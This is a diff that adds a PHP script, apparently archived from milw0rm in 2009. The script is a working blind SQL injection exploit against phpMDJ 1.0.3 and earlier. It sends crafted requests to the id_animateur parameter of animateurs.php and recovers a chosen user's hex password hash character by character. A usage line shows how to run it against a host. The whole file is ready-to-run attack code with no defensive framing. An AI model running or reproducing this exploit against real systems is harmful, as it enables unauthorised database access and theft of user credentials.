@@ -1,0 +1,77 @@
+--+++=========================================================+++--
+--+++====== phpMDJ <= 1.0.3 Blind SQL Injection Exploit ======+++--
+--+++=========================================================+++--
+
+<?php
+
+function query ($usr, $chr, $pos)
+{
+	$query = "x' OR ASCII(SUBSTRING((SELECT mdp FROM phpmdj_users WHERE pseudo = '{$usr}'),{$pos},1))={$chr} OR '1' = '2";
+	$query = str_replace (" ", "%20", $query);
+	$query = str_replace ("'", "%27", $query);
+	return $query;
+}
+
+function exploit ($hostname, $path, $usr, $chr, $pos)
+{
+	$chr = ord ($chr);
+
+	$fp = fsockopen ($hostname, 80);
+
+	$query = query ($usr, $chr, $pos);
+	$request = "GET {$path}/animateurs.php?id_animateur={$query} HTTP/1.1\r\n".
+		   "Host: {$hostname}\r\n".
+		   "Connection: Close\r\n\r\n";
+
+	fputs ($fp, $request);
+
+	while (!feof ($fp))
+		$reply .= fgets ($fp, 1024);
+	
+	fclose ($fp);
+	preg_match ("/Les animateurs<\/a> :(.+)<\/h2>/", $reply, $x);
+
+	if (strlen (trim ($x [1])) == 0)
+		return false;
+	else
+		return true;
+}
+
+function usage ()
+{
+	echo
+		"\n[+] phpMDJ <= 1.0.3 Blind SQL Injection Exploit".
+		"\n[+] Author: darkjoker".
+		"\n[+] Site  : http://darkjoker.net23.net".
+		"\n[+] Usage : php xpl.php <hostname> <path> <username>".
+		"\n[+] Ex.   : php xpl.php localhost /phpMDJ admin".
+		"\n\n";
+	exit ();
+}
+
+if ($argc != 4)
+	usage ();
+
+$hostname = $argv [1];
+$path = $argv [2];
+$user = $argv [3];
+$key = "abcdef0123456789";
+$pos = 1;
+$chr = 0;
+
+echo "[+] Password: ";
+
+while ($pos <= 32)
+{
+	if (exploit ($hostname, $path, $user, $key [$chr], $pos))
+	{
+		echo $key [$chr];
+		$chr = -1;
+		$pos++;
+	}
+	$chr++;
+}
+
+echo "\n\n";
+
+# milw0rm.com [2009-01-11]
